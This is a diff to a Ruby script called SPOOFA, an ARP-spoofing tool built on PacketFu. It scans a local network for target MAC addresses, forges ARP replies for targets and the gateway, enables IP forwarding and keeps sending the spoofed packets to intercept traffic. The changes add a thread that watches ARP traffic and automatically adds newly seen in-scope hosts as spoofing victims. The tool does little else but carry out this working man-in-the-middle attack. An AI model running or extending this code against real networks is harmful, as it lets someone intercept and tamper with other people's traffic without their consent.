@@ -1,4 +1,5 @@
 #!/usr/bin/env ruby
+
 =begin
 
 # SPOOFA - for ARP-spoofing local networks #
@@ -121,11 +122,11 @@ def target_scanner(targets, timeout)
   @targets_hash = {}
   if @parallel
     threads = []                                  # To keep track of the child processes/threads
-    mutex = Mutex.new
+    @mutex = Mutex.new
     targets.each do |ip|
       threads << Thread.new do
         @targets_hash[ip] = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
-        mutex.synchronize do                      # Mutex prevents mutiple threads writing to the screen at the same time
+        @mutex.synchronize do                     # Mutex prevents mutiple threads writing to the screen at the same time
           if @targets_hash[ip]
             print "\n#{ip} \tmac is #{@targets_hash[ip]} " if @verbose
           elsif @verbose
@@ -152,6 +153,55 @@ def target_scanner(targets, timeout)
   @targets_hash.delete(@gateway)
 end
 
+# Make arrays of packets for targets and gateway
+def make_packet_array(target_hash)
+  if @two_way
+    @gateway_packets = [] unless @gateway_packets
+    target_hash.each do |target, _|
+      build_pkt(@gateway_mac, target, @gateway)
+      @gateway_packets << @arp_pkt
+    end
+  end
+  @target_packets  = [] unless @target_packets
+  target_hash.each do |target, target_mac|
+    build_pkt(target_mac, @gateway, target)
+    @target_packets << @arp_pkt
+    @mutex.synchronize do
+      target_hash.delete(target) if target_hash == @new_targets # delete target once packets made
+    end
+  end
+end
+
+# continuously monitors network for new ARPs, then adds them to @new_targets.
+def arp_monitor
+
+  @new_targets = {}
+  arp_thread = Thread.new do
+    @arp_cap = PacketFu::Capture.new(:iface => @defaults[:iface], :filter => "arp and not ether src #{@defaults[:eth_saddr]}")
+    @arp_cap.stream.each do |p|
+      arp_pkt = PacketFu::Packet.parse p
+      ipaddr = arp_pkt.arp_saddr_ip
+      if in_scope?(ipaddr) && ipaddr != @defaults[:ip_saddr] && !@targets_hash.include?(ipaddr)
+        if arp_pkt.arp_opcode == 1
+          #@mutex.synchronize do
+            @new_targets[ipaddr] = PacketFu::Utils::arp(ipaddr, :timeout => 3, :iface => @iface)
+            sleep 5
+          #end
+          puts_verbose("\nNew target arrived; #{ipaddr} 1\n")
+        elsif arp_pkt.arp_opcode == 2
+          @new_targets[ipaddr] = arp_pkt.arp_saddr_mac
+          puts_verbose("\nNew target arrived; #{ipaddr} 2\n")
+        end
+          make_packet_array(@new_targets) # makes additional spoof packets for any new targets # unless @new_targets.nil?
+      end
+    end
+  end
+end
+
+def in_scope?(ip)
+  @target.include?(ip)
+end
+
 def neat_exit
   if @send_packets
     puts "\nRe-ARPing the network..."
@@ -172,7 +222,7 @@ def neat_exit
     puts "...done."
   end
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
-  puts "\nExiting Spoofa\n"
+  puts "\nExiting Spoofa\n\n"
   exit 0
 end
 
@@ -289,32 +339,21 @@ unless @gateway_mac
   (0..2).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => 5, :iface => @iface) } # Try twice more, then exit.
   puts "Unable to determine gateway mac."
   sleep 2
-  exit 0 
+  neat_exit
 end
 puts_verbose "#{@gateway} \tmac is #{@gateway_mac} (Gateway)"
 
 target_parse(target)
-target_scanner(@target, 2)
+target_scanner(@target, 3)
+make_packet_array(@targets_hash)
+arp_monitor
 
-# Make arrays of packets for targets and gateway
-@target_packets  = []
-@targets_hash.each do |target, target_mac|
-  build_pkt(target_mac, @gateway, target)
-  @target_packets << @arp_pkt
-end
-@gateway_packets = []
-if @two_way
-  @targets_hash.each do |target, _|
-    build_pkt(@gateway_mac, target, @gateway)
-    @gateway_packets << @arp_pkt
-  end
-end
-    
+
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 @send_packets = true
 while @send_packets
   print "\nSending spoofing packets to"
-  @targets_hash.each { |target, | print ": #{target}" }
+  @targets_hash.each { |target, _| print ", #{target}" }
   print " and gateway #{@gateway}" if @two_way
   print "\nPackets sent: " if @verbose
   count = 0
@@ -330,7 +369,7 @@ while @send_packets
       end
     end
     GC.start   # to deal with "memory leak" (more likely a problem calling GC)
-    print "#{count}; " if @verbose
+    print "#{count}, " if @verbose
     sleep 4
   end
 end
